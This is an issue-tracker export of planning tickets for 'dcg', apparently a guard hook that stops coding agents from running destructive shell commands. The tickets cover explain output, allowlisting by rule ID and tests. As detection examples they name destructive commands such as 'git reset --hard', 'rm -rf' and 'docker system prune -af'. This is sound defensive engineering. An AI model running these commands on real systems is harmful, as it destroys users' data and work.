{"id":"git_safety_guard-1gt","title":"Epic: Explainability, UX, and Operations","description":"# Epic: Explainability, UX, and Operations\n\n## Why this epic exists\n\nEven a correct guard will occasionally block or warn. When that happens, the tool must:\n\n- Explain *what* matched (pack + pattern), *where* it matched (execution context), and *why* it’s considered dangerous.\n- Provide clear, low-friction escape hatches (manual run guidance, allowlisting, warn/log-only modes).\n- Produce logs that allow teams to diagnose false positives and tune configuration.\n\nWithout this, users experience “annoying and disruptive” interruptions and will disable the guard.\n\n## Goals\n\n1. **Explainability:** a human can quickly understand the decision without reading source.\n2. **Ergonomics for coding agents:** easy to test, easy to allowlist, easy to see what would be blocked.\n3. **Operational knobs:** block vs warn vs log-only; per-pack enable/disable; per-pattern allowlist.\n4. **High-quality logging:** deterministic, machine-parseable (optional), and privacy-conscious.\n\n## Non-goals\n\n- Building a full policy language; keep configuration understandable.\n\n## Success Criteria\n\n- A user can run something like `dcg test --explain \"...\"` and see:\n  - normalized command\n  - execution contexts detected\n  - packs considered/skipped (keyword gating)\n  - the first blocking match with `pack_id` + `pattern_name`\n- The deny/warn message includes a stable identifier that can be allowlisted without copying regexes.\n- Logging can be enabled to collect blocked events with timestamps, pack/pattern IDs, and command (with optional redaction).\n","status":"open","priority":2,"issue_type":"epic","created_at":"2026-01-07T19:57:39.637876513-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:51:51.649182324-05:00"}
{"id":"git_safety_guard-1gt.1","title":"Add dcg explain (full decision trace; pretty/json/compact)","description":"## Objective\n\nShip an explainability mode that makes `dcg` trustworthy and debuggable:\n\n- `dcg explain \"\u003ccommand\u003e\"` (primary UX)\n- `dcg test --explain \"\u003ccommand\u003e\"` (alias for existing CLI habits)\n\nExplain mode must show exactly why a command was allowed/blocked, with enough detail that users can resolve false positives quickly (goal: under 2 minutes).\n\n## Why this matters\n\nWhen a hook blocks a command, users immediately ask:\n\n- What matched?\n- Where did it match (executed vs data span)?\n- Which packs were considered vs skipped (keyword gating)?\n- What is the stable rule ID I should allowlist (without copying regex)?\n- What safe alternative should I use instead?\n\nIf we can’t answer these questions quickly, users disable the guard.\n\n## Hard constraints\n\n- Hook path must never hang: no interactive prompts, no waiting for stdin.\n- Fast path must stay fast: explain tracing is opt-in and must not add overhead when disabled.\n- Deterministic: the same input yields the same trace and rule ID.\n\n## Proposed UX\n\n### Pretty (default)\n\nBox/sectioned output designed for human scanning. Includes:\n\n- raw input command\n- normalized command\n- decision (ALLOW/WARN/DENY)\n- latency breakdown (per stage)\n- execution-context spans (executed vs data)\n- allowlist evaluation (entries checked + match, if any)\n- pack evaluation (packs checked vs skipped; first match)\n- stable rule id (`pack_id:pattern_name`)\n- matched span (byte offsets) + matched text preview\n- suggestions (safe alternatives + \"how to allow safely\" command examples)\n\n### JSON\n\nMachine-readable output for CI tooling, bug reports, and snapshot testing.\n\nMinimum fields:\n\n- `command`, `normalized_command`\n- `decision`\n- `total_duration_us`\n- `steps[]`: `{ name, duration_us, details }`\n- `context.spans[]`: `{ start, end, kind, text_preview? }`\n- `pack_summary`: enabled packs, skipped packs (keyword gating)\n- `match`: `{ pack_id, pattern_name, rule_id, reason, matched_span }`\n- `allowlist`: `{ layers_checked, matched_entry? }`\n- `suggestions[]`: `{ kind, text, command? }`\n\n### Compact\n\nSingle-line output suitable for logs:\n\n- `DENY core.git:reset-hard \"git reset --hard\" — \u003creason\u003e (847us)`\n\n## Technical design (trace model)\n\nAdd a trace data model that can be enabled in CLI-only modes:\n\n- `ExplainTrace { decision, steps[], match_identity?, suggestions[] }`\n- Each `TraceStep` records:\n  - stage name\n  - duration\n  - stage-specific details\n\nTrace steps should cover (at minimum):\n\n1. Input parsing (hook JSON vs CLI input)\n2. Pack-aware keyword gating (global quick reject)\n3. Normalization (wrappers, path stripping)\n4. Execution-context classification (spans)\n5. Allowlist checks (project/user/system)\n6. Pack evaluation (safe then destructive; which packs were skipped)\n7. Policy decision layer (deny vs warn vs log-only)\n8. Output formatting summary\n\nKey implementation constraint:\n\n- When tracing is disabled, the evaluator should not allocate or capture extra data.\n\n## Dependencies\n\nExplain mode becomes valuable only when these are in place:\n\n- deterministic pack evaluation + stable match identity (`pack_id` + `pattern_name`)\n- shared evaluator used by both CLI and hook\n- execution-context classification (or at least the safe string-arg registry)\n- allowlisting by rule ID (so explain can recommend an allowlist command)\n\n## Acceptance criteria\n\n- `dcg explain` works for both blocked and allowed commands.\n- For a blocked command, explain shows the exact `pack_id:pattern_name` and matched span.\n- For a false-positive-like command (e.g., `bd create --description=\"rm -rf\"`), explain explicitly shows the string span as data, and that matching was skipped for it.\n- Output is deterministic (golden tests stable across runs).\n- Hook path remains unchanged (no interactive prompt; no output for allow).\n\n## Test plan\n\n- Golden/snapshot tests for:\n  - pretty output (stable sections + key fields)\n  - JSON output schema\n  - compact single-line output\n- Determinism tests: same input run 100 times yields the same match identity.\n- Latency sanity: explain mode can be slower, but must remain bounded and must not affect hook mode when disabled.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:04:20.427652456-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:54.65954809-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:04:20.428791912-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T20:05:37.096250877-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:05:42.129983029-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:05:47.162937778-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-1gt.6","type":"supersedes","created_at":"2026-01-07T21:55:15.614236806-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.1","title":"Explain trace data model + opt-in instrumentation","description":"## Objective\n\nIntroduce a trace data model and instrumentation hooks in the shared evaluator so `dcg explain` can capture a complete decision trace.\n\nThis task is about:\n\n- defining trace structs/enums\n- collecting timings and key decision facts\n- ensuring tracing is truly opt-in (no overhead when disabled)\n\nIt is not about output formatting (pretty/json/compact), which is handled by sibling tasks.\n\n## Design requirements\n\n### Trace data structures\n\nDefine an internal, allocation-conscious model:\n\n- `ExplainTrace` (top-level)\n- `TraceStep` (name + duration + step-specific details)\n- `TraceDetails` variants for:\n  - keyword gating (enabled keywords summary + first hit)\n  - normalization transformations\n  - context spans (executed vs data)\n  - allowlist checks (layers checked + match)\n  - pack evaluation (packs considered vs skipped; patterns checked; first match)\n  - policy decision (deny/warn/log-only)\n\n### Match details (required for highlighting)\n\nWhen blocked (or warned), the trace must include:\n\n- `rule_id` / `pack_id` / `pattern_name`\n- `reason`\n- `matched_span` (byte offsets) and a small `matched_text_preview`\n\nThese come from the deterministic matcher work (`git_safety_guard-99e.2.4`).\n\n### Timing model\n\n- Capture per-step duration.\n- Capture total duration.\n- Use monotonic time (`Instant`) and store integer microseconds in final output.\n\n### Zero-overhead when disabled\n\n- The evaluator should accept something like `Option\u003c\u0026mut TraceCollector\u003e`.\n- In the hot path, avoid allocations when the option is `None`.\n- Do not build expensive strings unless tracing is enabled.\n\n## Acceptance criteria\n\n- Shared evaluator can optionally return `Decision + ExplainTrace` (or `Decision` plus trace in an outparam).\n- Trace includes enough raw data for:\n  - match highlighting\n  - pack skip reasons\n  - allowlist and context analysis summaries\n- When tracing is disabled, benchmarks show no measurable regression on the allow path.\n\n## Tests\n\n- Unit tests for:\n  - trace step ordering (stable)\n  - trace includes match identity and match span when blocked\n  - trace includes \"skipped\" packs when keyword gating skips\n- Microbench (or integration perf harness) verifying tracing disabled has no cost.\n","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T21:01:29.518970547-05:00","created_by":"ubuntu","updated_at":"2026-01-08T10:25:09.376456644-05:00","closed_at":"2026-01-08T10:25:09.376456644-05:00","close_reason":"Implemented trace data model: ExplainTrace, TraceStep, TraceDetails variants, MatchInfo, AllowlistInfo, PackSummary, TraceCollector. Zero-overhead design with opt-in instrumentation. 7 unit tests, 312 total tests pass, clippy clean.","dependencies":[{"issue_id":"git_safety_guard-1gt.1.1","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:01:39.20691745-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.1","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:20:29.600928657-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:20:34.696144333-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.2","title":"Explain output: pretty formatter + match highlighting","description":"## Objective\n\nImplement the human-friendly pretty output for `dcg explain`.\n\n## Output requirements\n\nPretty output should be optimized for answering:\n\n1. What was the decision?\n2. What matched (rule id) and where?\n3. Which spans were treated as executed vs data?\n4. What can I do next (safe alternatives, allowlist command)?\n\nMinimum sections:\n\n- Header: input + decision + total latency\n- Execution-context analysis:\n  - spans with byte ranges and kind\n  - optionally show a preview of each span\n- Pipeline trace:\n  - key stages with timings\n  - keyword gating details (enabled keyword summary + first hit)\n  - packs considered vs skipped\n- Match:\n  - rule id, reason\n  - matched span and matched text preview\n  - highlight match (underline/caret/box)\n- Suggestions:\n  - safe alternative(s)\n  - allowlist command example(s)\n\n## Determinism\n\n- Output ordering must be deterministic.\n- Field names and section order must be stable for golden tests.\n\n## Constraints\n\n- Colors should be disabled when stderr is not a TTY (match existing behavior).\n- Pretty output can be slightly verbose but should not exceed one screen for most commands.\n\n## Acceptance criteria\n\n- `dcg explain` pretty output is readable and includes all minimum sections.\n- For allowlisted decisions, pretty output shows the allowlist entry that matched.\n- For allowed-by-data-context decisions, pretty output explicitly states that matching was skipped for data spans.\n\n## Tests\n\n- Golden tests for 5-10 representative commands:\n  - clear allow\n  - clear deny\n  - allow due to safe string-arg registry\n  - allow due to allowlist override\n  - complex quoting / pipe case\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:01:55.28188435-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:01:55.28188435-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:02:05.115909525-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T21:20:39.791441242-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T21:21:16.32026071-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:21:26.506475271-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-99e.2.4","type":"blocks","created_at":"2026-01-07T22:38:30.01762765-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.3","title":"Explain output: JSON schema + snapshot tests","description":"## Objective\n\nImplement the `--format json` output for `dcg explain` and lock it down with snapshot tests.\n\n## Requirements\n\n### JSON schema (v1)\n\nThe JSON should be stable and explicit, with forward-compat in mind.\n\nMinimum:\n\n- `schema_version`: integer (start at 1)\n- `command`, `normalized_command`\n- `decision`: allow|warn|deny\n- `total_duration_us`\n- `steps[]`:\n  - `name`\n  - `duration_us`\n  - `details` (tagged union)\n- `context`:\n  - `spans[]`: `{ start, end, kind, preview? }`\n  - `safe_string_registry_match?`\n- `allowlist`:\n  - `layers_checked[]`\n  - `matched_entry?` (redacted if configured)\n- `match?`:\n  - `pack_id`, `pattern_name`, `rule_id`\n  - `reason`\n  - `matched_span`: `{ start, end }`\n  - `matched_text_preview?`\n- `suggestions[]`\n\n### Redaction\n\n- Provide a mode that redacts sensitive spans (e.g., quoted strings), or truncates previews.\n- Redaction must not break the schema.\n\n## Acceptance criteria\n\n- `dcg explain --format json` emits valid JSON for allow and deny decisions.\n- JSON ordering is stable (or we normalize before snapshot compare).\n- `schema_version` is present and documented.\n\n## Tests\n\n- Snapshot tests using representative commands (same set as pretty output tests).\n- A schema-shape test that asserts required keys exist.\n- A regression test ensuring new fields are additive only (no breaking changes without version bump).\n","notes":"## Review Additions (2026-01-08)\n\n### Determinism\n- JSON output must be deterministic for snapshot testing and tooling:\n  - stable `steps[]` ordering\n  - stable key ordering (or canonicalization step before snapshot compare)\n  - stable truncation/redaction rules","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:02:21.636616557-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:25:51.237608196-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:02:30.088365893-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T21:20:44.883423719-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T21:21:21.41269061-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:21:31.602200676-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-99e.2.4","type":"blocks","created_at":"2026-01-07T22:38:35.06090553-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.4","title":"Explain output: compact single-line formatter","description":"## Objective\n\nImplement the `--format compact` single-line output for `dcg explain`.\n\n## Why\n\nCompact output is useful for:\n\n- log files\n- CI summaries\n- quick debugging when you don't need the full trace\n\n## Format requirements\n\n- Must include: decision, rule id (when matched), short reason, latency.\n- Must include: a safely truncated command preview.\n\nExamples:\n\n- `ALLOW (94us) git status`\n- `DENY core.git:reset-hard (847us) git reset --hard — \u003creason\u003e`\n- `WARN containers.docker:system-prune (1.2ms) docker system prune -af — \u003creason\u003e`\n\n## Acceptance criteria\n\n- Compact output is one line with predictable tokenization.\n- Truncation is deterministic and does not break UTF-8.\n- Works for allow/warn/deny.\n\n## Tests\n\n- Golden tests for representative commands.\n- Truncation tests (very long command, unicode input).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:02:43.986061353-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:02:43.986061353-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.4","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:02:53.160853911-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.4","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T21:20:49.976697137-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.5","title":"Wire explain mode into CLI (dcg explain + test --explain)","description":"## Objective\n\nExpose explain mode through the CLI in an ergonomic way.\n\n## CLI design\n\n### Primary\n\n- `dcg explain \"\u003ccommand\u003e\" [--format pretty|json|compact]`\n\n### Alias\n\n- `dcg test \"\u003ccommand\u003e\" --explain [--format ...]`\n\nBoth should call the same shared evaluator + trace collector.\n\n## Behavioral requirements\n\n- Explain mode must not change hook behavior.\n- Explain mode must load config and enabled packs the same way as hook mode.\n- Explain mode must support optionally applying allowlists (project + user) for \"what would happen\" debugging.\n\n## Acceptance criteria\n\n- `dcg explain` exists and is documented in `dcg --help`.\n- `dcg test --explain` continues to work (or is introduced) as an alias.\n- Exit codes:\n  - allow: 0\n  - warn: 0 (but distinguish in output)\n  - deny: non-zero in CLI mode (optional, but document)\n\n## Tests\n\n- CLI integration tests that run the binary with `dcg explain` and assert expected output shape.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:03:07.448855603-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:03:07.448855603-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:03:15.799310699-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1.2","type":"blocks","created_at":"2026-01-07T21:20:55.072028651-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1.3","type":"blocks","created_at":"2026-01-07T21:21:00.168986127-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1.4","type":"blocks","created_at":"2026-01-07T21:21:05.261255534-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2","title":"Allowlist by stable rule ID (project/user allowlists + CLI)","description":"## Objective\n\nMake customization safe, ergonomic, and auditable by allowing users to allowlist specific rules via stable identifiers `(pack_id, pattern_name)` instead of raw regex.\n\nIn other words:\n\n- allowlist a rule like `core.git:reset-hard`\n- not a broad regex like `pattern = \"rm -rf.*\"`\n\nThis must dramatically reduce velocity-destroying false positives while preserving safety.\n\n## Why rule ID, not regex?\n\nRaw regex allow-overrides are:\n\n- dangerous (easy to allow too much)\n- brittle (regex changes can break intent)\n- hard to audit\n\nRule ID allowlisting is:\n\n- constrained (only bypasses a specific rule)\n- stable (survives regex refactors)\n- auditable (\"who allowed what and why\")\n\n## Allowlist layers\n\nWe want three layers (highest priority first):\n\n1. Project allowlist (checked into repo): `.dcg/allowlist.toml`\n2. User allowlist (per user machine): `~/.config/dcg/allowlist.toml` (or embedded in config)\n3. System allowlist (optional): `/etc/dcg/allowlist.toml`\n\nProject allowlist is the most important: one fix benefits the whole team via code review.\n\n## File format (`.dcg/allowlist.toml`)\n\nEntry types (safe-by-default first):\n\n1. `rule = \"pack_id:pattern_name\"` (recommended)\n2. `exact_command = \"...\"` (rare)\n3. `command_prefix = \"...\"` + `context = \"string-argument\"|...` (for documentation tools)\n4. `pattern = \"...\"` (regex) only when `risk_acknowledged=true`\n\nAdditional fields:\n\n- `reason` (required)\n- `added_by`, `added_at` (strongly recommended; CLI should set)\n- `expires_at` (optional; expired entries ignored)\n- `conditions` map (optional; env-gated, e.g. CI=true)\n\nWildcard rules:\n\n- allow `core.git:*` style within a pack\n- do NOT allow `*:*`\n\n## CLI commands\n\nDesign goal: users should not have to hand-edit TOML to fix a false positive.\n\n- `dcg allowlist add \u003crule_id\u003e --reason \"...\" [--project|--user] [--expires ...] [--condition KEY=VAL]`\n- `dcg allowlist add-command \"\u003ccmd\u003e\" --reason \"...\" [--expires ...]`\n- `dcg allowlist list [--project|--user]`\n- `dcg allowlist remove \u003crule_id|entry_id\u003e`\n- `dcg allowlist validate` (strict validation + warnings for risky entries)\n\nIntegration with explain mode:\n\n- `dcg explain` should print the exact allowlist command needed to allow the match.\n\n## Evaluator integration\n\n- Allowlist evaluation happens after we have a candidate match identity.\n- Allowlisting a rule must bypass ONLY that rule (not other rules in other packs).\n- Explain mode must report:\n  - which allowlist layer matched\n  - which entry matched\n  - the override (DENY -\u003e ALLOW, DENY -\u003e WARN, etc if modes exist)\n\n## Security constraints\n\n- invalid regex or invalid TOML must never crash the hook; fail open with warnings (CLI should be strict)\n- risky allowlist shapes must be noisy:\n  - require `risk_acknowledged=true` for regex entries\n  - warn on overly broad patterns\n  - warn on wildcards like `core.git:*`\n\n## Acceptance criteria\n\n- A user can allowlist a single named rule without writing regex.\n- Unit tests confirm allowlisting does not accidentally allow unrelated dangerous commands.\n- Expired allowlist entries are ignored and surfaced in `dcg allowlist validate`.\n- Allowlist layering works (project overrides user, etc).\n\n## Tests\n\n- allowlist parser tests\n- allowlist match tests:\n  - rule id exact\n  - rule id wildcard\n  - exact command\n  - prefix+context\n  - regex (requires ack)\n- allowlist integration tests:\n  - blocked command becomes allowed when allowlisted\n  - unrelated dangerous command remains blocked\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:04:52.747995072-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:03:45.397800662-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:04:52.749139728-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:05:52.198404888-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:05:57.230809781-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.1","title":"Allowlist: file format + parsing + layering (project/user/system)","description":"## Objective\n\nImplement parsing and loading of allowlist files across layers:\n\n- project: `.dcg/allowlist.toml`\n- user: `~/.config/dcg/allowlist.toml` (or config-embedded)\n- system: `/etc/dcg/allowlist.toml` (optional)\n\n## Requirements\n\n- Parse TOML into a strongly-typed `Allowlist` model.\n- Validate required fields (`reason` etc.) and represent invalid entries without panicking.\n- Layer precedence should be explicit and testable.\n- Loading failures:\n  - hook mode: must not crash; treat as no allowlist for that layer\n  - CLI validate: should surface errors clearly\n\n## Acceptance criteria\n\n- All layers load independently.\n- Missing files are treated as empty allowlists.\n- Invalid TOML or invalid entries do not crash the hook.\n\n## Tests\n\n- Parse valid allowlists.\n- Reject/flag invalid allowlists.\n- Precedence tests: project overrides user.\n","status":"closed","priority":2,"issue_type":"task","assignee":"PurpleRobin","created_at":"2026-01-07T21:04:01.129218009-05:00","created_by":"ubuntu","updated_at":"2026-01-08T02:22:46.568466197-05:00","closed_at":"2026-01-08T02:22:46.568466197-05:00","close_reason":"Implemented allowlist TOML schema parsing + layered loader (project/user/system) with fail-open behavior + unit tests","dependencies":[{"issue_id":"git_safety_guard-1gt.2.1","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:04:09.493546553-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.2","title":"Allowlist: evaluator integration (override decision safely)","description":"## Objective\n\nIntegrate allowlist checks into the shared evaluator.\n\n## Required behavior\n\n- Evaluate packs and find the first high-confidence match.\n- Compute the stable rule ID `pack_id:pattern_name`.\n- Check allowlists after match identity is known.\n- If allowlisted:\n  - override DENY -\u003e ALLOW (or DENY -\u003e WARN if decision modes exist)\n  - record the allowlist reason and layer for explain/logging\n\nSafety rule:\n\n- Allowlisting must only bypass the specific matched rule (or an allowed pack-scoped wildcard). It must not disable other packs.\n\n## Edge cases\n\n- Patterns with no `pattern_name`: define a policy (either forbid allowlisting or synthesize a stable name).\n- Multiple matches: only the \"winning\" match should be allowlist-checkable (unless we later support multi-match reporting).\n\n## Acceptance criteria\n\n- Allowlisting a rule bypasses only that rule.\n- Non-allowlisted dangerous commands remain blocked.\n- Explain and logs can show the allowlist override (layer + entry).\n\n## Tests\n\n- Unit tests:\n  - allowlist hit overrides deny\n  - allowlist miss does not change decision\n  - wildcard allowlist matches only within pack\n- Integration test: end-to-end deny becomes allow when allowlisted.\n","status":"closed","priority":2,"issue_type":"task","assignee":"PurpleRobin","created_at":"2026-01-07T21:04:25.133130057-05:00","created_by":"ubuntu","updated_at":"2026-01-08T03:10:34.751026929-05:00","closed_at":"2026-01-08T03:10:34.751026929-05:00","close_reason":"Evaluator + hook allowlist override semantics; added tests; ran fmt/check/clippy/test/e2e","dependencies":[{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:04:34.537722772-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-1gt.2.1","type":"blocks","created_at":"2026-01-07T21:21:41.223599417-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:21:46.350674835-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:21:51.466844665-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.3","title":"Allowlist CLI: add/list/remove/validate (project + user)","description":"## Objective\n\nImplement `dcg allowlist` CLI commands so users can fix false positives without editing TOML by hand.\n\n## Commands (v1)\n\nPrimary namespace:\n\n- `dcg allowlist add \u003crule_id\u003e --reason \"...\" [--project|--user] [--expires ...] [--condition KEY=VAL]`\n- `dcg allowlist add-command \"\u003ccmd\u003e\" --reason \"...\" [--project|--user] [--expires ...]`\n- `dcg allowlist list [--project|--user]`\n- `dcg allowlist remove \u003crule_id|entry_id\u003e [--project|--user]`\n- `dcg allowlist validate [--project|--user]`\n\nErgonomic aliases (high-value):\n\n- `dcg allow \u003crule_id\u003e --reason \"...\" [--project|--user]` → alias of `allowlist add`\n- `dcg unallow \u003crule_id|entry_id\u003e [--project|--user]` → alias of `allowlist remove`\n\nRationale: deny messages can print shorter copy/paste commands.\n\n## Behavioral requirements\n\n- Default scope should be explicit:\n  - either require `--project|--user`, or default to project if in a git repo and file exists\n- All mutations must preserve TOML readability (stable ordering; keep comments where feasible).\n- CLI should set audit metadata automatically:\n  - `added_by` (from env/user)\n  - `added_at` (RFC3339)\n\n## Acceptance criteria\n\n- CLI can create `.dcg/allowlist.toml` if missing.\n- CLI mutations are idempotent and stable (no reordering chaos).\n- Validate prints actionable errors/warnings.\n\n## Tests\n\n- CLI integration tests for add/list/remove (including alias commands).\n- Validation tests for:\n  - expired entries\n  - missing reason\n  - unknown rule id\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:04:49.686087604-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:27:34.932677029-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.3","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:04:59.51609388-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.3","depends_on_id":"git_safety_guard-1gt.2.1","type":"blocks","created_at":"2026-01-07T21:21:56.560137459-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.4","title":"Allowlist: conditions, expiration, and wildcard safety rules","description":"## Objective\n\nImplement the more advanced allowlist semantics in a way that is safe and predictable.\n\n## Semantics to support\n\n### 1) Expiration\n\n- `expires_at` field on entries.\n- Expired entries:\n  - evaluator: ignored\n  - validate: warning (or error if `--strict`)\n\n### 2) Conditions (environment gating)\n\n- `conditions = { KEY = \"VAL\" }` maps to environment variables.\n- Conditions are ANDed.\n- Missing env var means condition not met.\n\n### 3) Wildcards\n\n- Allow `pack_id:*` (scoped to one pack).\n- Disallow `*:*`.\n- Allow `pack_id:prefix-*` only if we commit to stable naming conventions.\n\n### 4) Risk acknowledgement\n\n- Regex allowlist entries require `risk_acknowledged=true`.\n- Validation should warn on overly broad regex (heuristics).\n\n## Acceptance criteria\n\n- Expiration works and is test-covered.\n- Conditions work (CI-only allowlists etc).\n- Wildcard constraints prevent unsafe global bypass.\n\n## Tests\n\n- Expiration tests using fixed timestamps.\n- Condition tests with env var manipulation.\n- Wildcard constraint tests.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:05:14.997598561-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:05:14.997598561-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.4","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:05:24.524137941-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.4","depends_on_id":"git_safety_guard-1gt.2.1","type":"blocks","created_at":"2026-01-07T21:22:01.654562185-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.4","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:22:06.749684456-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.5","title":"Allowlist: comprehensive tests + documentation","description":"## Objective\n\nMake allowlisting safe in practice by shipping:\n\n- comprehensive automated tests\n- clear user documentation\n\n## Tests\n\n### Parser/validation\n\n- invalid TOML does not crash hook\n- missing required fields surfaced in validate\n- risky entries require acknowledgement\n\n### Evaluator integration\n\n- allowlist overrides only the intended rule\n- allowlisting does not disable other packs\n- allowlist layer precedence works\n\n### CLI\n\n- add/list/remove idempotence\n- validate output contains actionable messages\n\n## Docs\n\n- README section: \"Resolving false positives\" describing:\n  - `dcg explain`\n  - `dcg allowlist add ...`\n  - recommended allowlist shapes\n  - security caveats\n\n## Acceptance criteria\n\n- Tests cover the core allowlist behaviors and guard against regressions.\n- Docs are sufficient that a user can resolve a false positive without reading 